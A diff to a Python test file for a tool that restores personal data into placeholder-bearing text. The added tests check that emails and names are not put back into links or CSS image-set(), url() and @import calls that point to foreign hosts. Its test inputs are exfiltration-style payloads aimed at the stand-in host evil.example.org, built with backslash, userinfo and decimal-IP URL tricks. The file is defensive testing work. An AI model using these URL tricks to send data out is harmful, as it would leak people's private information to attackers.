@@ -187,6 +187,16 @@ def test_nothing_is_restored_inside_a_foreign_link(settings, answer):
     assert (result.text, kinds(result)) == (answer, ["foreign_link"])
 
 
+def test_host_is_after_the_last_at_sign(settings):
+    """Найдено при исправлении обратных косых, P1: браузер берёт хост за последним «@» адреса, а не за первым —
+    «https://a@наш:1@evil…» ведёт на evil. Имя пользователя и пароль у нашего адреса ссылку чужой не делают."""
+    answer = "https://a@host-1.domain-1.example:1@evil.example.org/?q=<EMAIL_1>"
+    result = restore(link_state(), answer, settings)
+    assert (result.text, kinds(result)) == (answer, ["foreign_link"])
+    own = restore(link_state(), "https://a:b@host-1.domain-1.example:8080/?q=<EMAIL_1>", settings)
+    assert own.text == "https://a:b@srv-dc01.contoso.ru:8080/?q=ivanov@contoso.ru"
+
+
 def test_own_links_and_labels_next_to_foreign_links_are_restored(settings):
     state = link_state()
     own = restore(state, "https://host-1.domain-1.example/?q=<EMAIL_1>", settings)
@@ -197,6 +207,43 @@ def test_own_links_and_labels_next_to_foreign_links_are_restored(settings):
     assert after.text == "[docs](https://evil.example.org/x_(1)) пишет ivanov@contoso.ru"
     plain = restore(state, "Сайт www.example.org без меток", settings)
     assert (plain.text, plain.segments) == ("Сайт www.example.org без меток", [])
+
+
+@pytest.mark.parametrize(
+    "answer",
+    [
+        r'<img src="\\evil.example.org/p?q=<EMAIL_1>">',
+        r'<a href="https:\\evil.example.org/?q=<EMAIL_1>">',
+        r"https://\evil.example.org/?q=<EMAIL_1>",
+        r"[x](https:/\evil.example.org/?q=<EMAIL_1>)",
+        r'<img src="/\evil.example.org/p?q=<EMAIL_1>">',
+        '<a href="ht\ntps:\t\\\\evil.example.org/?q=<EMAIL_1>">',
+        '<img src="http:evil.example.org/p?q=<EMAIL_1>">',
+        "https:evil.example.org/?q=<EMAIL_1>",
+        r"file:\\evil.example.org\share\<EMAIL_1>",
+        r"\\evil.example.org\share\<EMAIL_1>",
+        r"[x](https://host-1.domain-1.example/?next=\\evil.example.org/<EMAIL_1>)",
+    ],
+)
+def test_backslashes_and_missing_slashes_lead_a_link_to_a_foreign_host(settings, answer):
+    """Хэнд-офф, P1: браузер читает «\\» в адресе с особой схемой как «/» и пропускает любую череду косых после
+    схемы, даже пустую, — все эти адреса ведут на evil.example.org (WHATWG URL)."""
+    result = restore(link_state(), answer, settings)
+    assert (result.text, kinds(result)) == (answer, ["foreign_link"])
+
+
+@pytest.mark.parametrize(
+    "answer, restored",
+    [
+        (r"https:\\host-1.domain-1.example\wiki?u=<EMAIL_1>", r"https:\\srv-dc01.contoso.ru\wiki?u=ivanov@contoso.ru"),
+        (r'<a href="\\host-1.domain-1.example\s\<EMAIL_1>">', r'<a href="\\srv-dc01.contoso.ru\s\ivanov@contoso.ru">'),
+        (r'path = "C:\\Users\\<EMAIL_1>\\report.docx"', r'path = "C:\\Users\\ivanov@contoso.ru\\report.docx"'),
+    ],
+)
+def test_own_links_and_paths_with_backslashes_are_restored(settings, answer, restored):
+    """Та же находка с другой стороны: наш адрес с обратными косыми восстанавливается, а «\\\\» внутри пути
+    Windows в строке кода — не начало адреса."""
+    assert restore(link_state(), answer, settings).text == restored
 
 
 @pytest.mark.parametrize(
@@ -227,13 +274,68 @@ def test_nothing_is_restored_inside_a_foreign_link_split_by_whitespace(settings,
         'b { background: url("https://evil.example.org/?q=\n<EMAIL_1>") }',
         '@import "https://evil.example.org/?q= <EMAIL_1>";',
         "@import url('https://evil.example.org/?q= <EMAIL_1>');",
+        '<style>a{background:url("https://evil.example.org/?q= <EMAIL_1></style>',
+        "@import 'https://evil.example.org/?q= <EMAIL_1>",
     ],
 )
 def test_nothing_is_restored_inside_a_foreign_css_url(settings, answer):
     """FINDINGS P2 «Restore: CSS url("…") with a space inside a style element»: адрес в url(…) и @import
-    загружается сам и в элементе style, и в файле CSS; аргумент — целиком, до той же кавычки или до «)»."""
+    загружается сам и в элементе style, и в файле CSS; аргумент — целиком, до той же кавычки или до «)».
+    Строку без закрывающей кавычки CSS кончает концом текста и тоже загружает (найдено при исправлении
+    image-set)."""
     result = restore(link_state(), answer, settings)
     assert (result.text, kinds(result)) == (answer, ["foreign_link"])
+
+
+@pytest.mark.parametrize(
+    "answer",
+    [
+        '<style>a{background-image:image-set("https://evil.example.org/?q= <EMAIL_1>" 1x)}</style>',
+        "<style>a{background-image:-webkit-image-set('https://evil.example.org/?q= <EMAIL_1>' 1x)}</style>",
+        '@font-face { src: src("https://evil.example.org/f?q= <EMAIL_1>") }',
+        'a { background: image-set("a.png" 1x, "https://evil.example.org/?q= <EMAIL_1>" 2x) }',
+        'a { background: IMAGE-SET(\n  "a.png" 1x,\n  "https://evil.example.org/?q= <EMAIL_1>" 2x\n) }',
+        'a { background: image-set(linear-gradient(rgb(0 0 0/50%), red) 1x,'
+        ' "https://evil.example.org/?q= <EMAIL_1>" 2x) }',
+        'a { background: image-set("a).png" 1x, /* ) */ "https://evil.example.org/?q= <EMAIL_1>" 2x) }',
+        'a { background: image-set(var(--a, {;}) 1x, "https://evil.example.org/?q= <EMAIL_1>" 2x) }',
+        'a { background: image-set(' + "f(" * 6 + ")" * 6 + ' 1x, "https://evil.example.org/?q= <EMAIL_1>" 2x) }',
+        '<style>a{background:image-set("a.png" 1x, "https://evil.example.org/?q= <EMAIL_1>"',
+    ],
+)
+def test_nothing_is_restored_inside_a_foreign_css_image_set(settings, answer):
+    """Хэнд-офф, P2: строку в image-set() — в любом варианте, не только в первом, — и в src() браузер загружает
+    сам, как url(). Вызов берётся целиком по скобкам: градиент, var() с блоком, «)» в строке и в комментарии его
+    не кончают; вложенность глубже разбираемой и незакрытый вызов тянутся до конца ответа."""
+    result = restore(link_state(), answer, settings)
+    assert (result.text, kinds(result)) == (answer, ["foreign_link"])
+
+
+@pytest.mark.parametrize(
+    "answer, restored",
+    [
+        (
+            'b { background: image-set("img/<EMAIL_1>.png" 1x) }',
+            'b { background: image-set("img/ivanov@contoso.ru.png" 1x) }',
+        ),
+        (
+            'b { background: image-set("https://host-1.domain-1.example/a b.png" 1x, "c.png" 2x) }',
+            'b { background: image-set("https://srv-dc01.contoso.ru/a b.png" 1x, "c.png" 2x) }',
+        ),
+        (
+            'b { background: image-set("https://evil.example.org/a.png" 1x) } /* автор <EMAIL_1> */',
+            'b { background: image-set("https://evil.example.org/a.png" 1x) } /* автор ivanov@contoso.ru */',
+        ),
+        (
+            "Функция image-set() выбирает картинку (см. https://wiki.example.org/css), автор <EMAIL_1>",
+            "Функция image-set() выбирает картинку (см. https://wiki.example.org/css), автор ivanov@contoso.ru",
+        ),
+    ],
+)
+def test_own_and_nearby_css_image_sets_are_restored(settings, answer, restored):
+    """Та же находка с другой стороны: наш и относительный адрес в image-set() восстанавливаются, метка после
+    закрытого вызова — тоже, и в тексте, где image-set() только упомянут."""
+    assert restore(link_state(), answer, settings).text == restored
 
 
 @pytest.mark.parametrize(
@@ -440,10 +542,13 @@ def test_letters_that_fold_to_ascii_are_not_label_letters(settings, answer):
         ("file:///C:/Users/<PERSON_1>/a.txt", "file:///C:/Users/Иван Петров/a.txt"),
         ("x = 1; //TODO:<PERSON_1>", "x = 1; //TODO:Иван Петров"),
         ("//TODO(<PERSON_1>): проверить", "//TODO(Иван Петров): проверить"),
+        (r"file:\\\C:\Users\<PERSON_1>\a.txt", r"file:\\\C:\Users\Иван Петров\a.txt"),
+        (r"\\fs01\home\<PERSON_1>", r"\\fs01\home\Иван Петров"),
     ],
 )
 def test_local_file_link_and_code_comment_are_not_foreign_links(settings, answer, restored):
-    """FINDINGS P3 «Restore: small defects»: «file:///» без хоста и «//TODO:» в коде на чужой узел не ведут."""
+    """FINDINGS P3 «Restore: small defects»: «file:///» без хоста и «//TODO:» в коде на чужой узел не ведут;
+    с обратными косыми (хэнд-офф, P1) — так же, и путь UNC к узлу без домена тоже."""
     assert restore(person_state(), answer, settings).text == restored
 
 
@@ -458,11 +563,13 @@ def test_local_file_link_and_code_comment_are_not_foreign_links(settings, answer
         "//evil%2Eexample%2Eorg/?q=<PERSON_1>",
         "//evil。example。org/?q=<PERSON_1>",
         "//TODO:x//evil/?q=<PERSON_1>",
+        r"\\1572395042\?q=<PERSON_1>",
+        r"\\fs01\?next=\\1572395042\<PERSON_1>",
     ],
 )
 def test_file_and_protocol_relative_links_to_a_host_stay_foreign(settings, answer):
     """Та же находка с другой стороны: хост у «file://», имя с точкой (и то, что браузер превратит в точку),
-    число вместо IPv4 и второй адрес оставляют ссылку чужой."""
+    число вместо IPv4 и второй адрес — в том числе за обратными косыми — оставляют ссылку чужой."""
     result = restore(person_state(), answer, settings)
     assert (result.text, kinds(result)) == (answer, ["foreign_link"])
 
